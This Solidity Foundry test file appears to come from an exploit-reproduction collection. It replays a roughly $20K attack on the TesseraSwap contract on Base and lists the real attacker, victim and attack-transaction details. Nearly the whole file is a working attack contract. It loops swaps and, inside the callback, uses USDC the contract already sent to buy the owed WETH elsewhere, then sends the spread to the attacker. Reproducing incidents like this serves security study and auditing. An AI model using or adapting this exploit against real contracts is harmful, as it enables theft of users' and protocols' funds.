// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$20K
// Attacker : 0x2352a1fca90182509dca9c12b2cad582a38e8b82
// Attack Contract : 0x74513519689b1fb427747624a4dd87b3849d39cd
// Vulnerable Contract : 0x55555522005bcae1c2424d474bfd5ed477749e3e
// Victim : 0x3dbe077e7986657e95e1cc50089f17a5a4af0aae
// Attack Tx : https://basescan.org/tx/0xc2df72ff612c90e07c9e051e7772a39f31fb4ca9e61f5b705f921bffa26b36de

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x55555522005bcae1c2424d474bfd5ed477749e3e#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/3038
//
// TesseraSwap transferred USDC from its treasury before collecting WETH from the attacker callback. The attacker
// used the received USDC to buy the owed WETH externally, repaid Tessera, and kept the WETH/USDC spread.

address constant ATTACKER = 0x2352a1FcA90182509dCa9c12B2CAd582a38E8b82;
address constant TESSERA_SWAP = 0x55555522005BcAE1c2424D474BfD5ed477749E3e;
address constant WETH_TOKEN = 0x4200000000000000000000000000000000000006;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant WETH_USDC_POOL = 0x6c561B446416E1A00E8E93E221854d6eA4171372;

interface ITesseraSwap {
    function tesseraSwapWithCallback(
        address tokenIn,
        address tokenOut,
        int256 amountSpecified,
        uint256 amountCheck,
        address recipient,
        bytes calldata callbackData,
        bytes calldata swapData
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    uint256 private constant FORK_BLOCK = 46_175_320;
    uint256 private constant MIN_USDC_PROFIT = 10_000_000;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        fundingToken = USDC_TOKEN;
        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(WETH_TOKEN);
        _addFundingToken(USDC_TOKEN);

        vm.label(ATTACKER, "Attacker");
        vm.label(TESSERA_SWAP, "TesseraSwap");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_USDC_POOL, "WETH/USDC Pool");
    }

    function testExploit() public balanceLog {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);
        TesseraSwapAttacker attackContract = new TesseraSwapAttacker();

        vm.startPrank(ATTACKER, ATTACKER);
        attackContract.executeAttack();
        vm.stopPrank();

        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - usdcBefore;

        assertGt(usdcProfit, MIN_USDC_PROFIT, "USDC profit");
    }
}

contract TesseraSwapAttacker {
    uint256 private constant LOOP_COUNT = 100;
    uint256 private constant TRACE_WETH_IN = 24_043_971_311_659_606_016;
    uint256 private constant WETH_PER_LOOP = TRACE_WETH_IN / LOOP_COUNT;
    // Permissive bound above the live pool price for small exact-output USDC -> WETH swaps.
    uint160 private constant PRICE_LIMIT_MULTIPLIER = 2;

    ITesseraSwap private constant tesseraSwap = ITesseraSwap(TESSERA_SWAP);
    IPancakeV3Pool private constant wethUsdcPool = IPancakeV3Pool(WETH_USDC_POOL);
    IERC20 private constant weth = IERC20(WETH_TOKEN);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function executeAttack() external {
        for (uint256 i; i < LOOP_COUNT; ++i) {
            tesseraSwap.tesseraSwapWithCallback(
                WETH_TOKEN, USDC_TOKEN, int256(WETH_PER_LOOP), 0, address(this), bytes(""), bytes("")
            );
        }

        uint256 usdcProfit = usdc.balanceOf(address(this));
        if (usdcProfit > 0) {
            usdc.transfer(ATTACKER, usdcProfit);
        }
    }

    function tesseraSwapCallback(
        int256 amountIn,
        int256 amountOut,
        bytes calldata
    ) external {
        require(msg.sender == TESSERA_SWAP, "only TesseraSwap");
        require(amountIn > 0 && amountOut < 0, "unexpected Tessera deltas");

        // Buy exactly the WETH owed with part of the USDC Tessera already sent.
        (uint160 sqrtPriceX96,,,,,,) = wethUsdcPool.slot0();
        wethUsdcPool.swap(address(this), false, -amountIn, sqrtPriceX96 * PRICE_LIMIT_MULTIPLIER, bytes(""));

        weth.transfer(TESSERA_SWAP, uint256(amountIn));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == WETH_USDC_POOL, "only WETH/USDC pool");
        require(amount0Delta < 0 && amount1Delta > 0, "unexpected pool deltas");

        usdc.transfer(msg.sender, uint256(amount1Delta));
    }
}
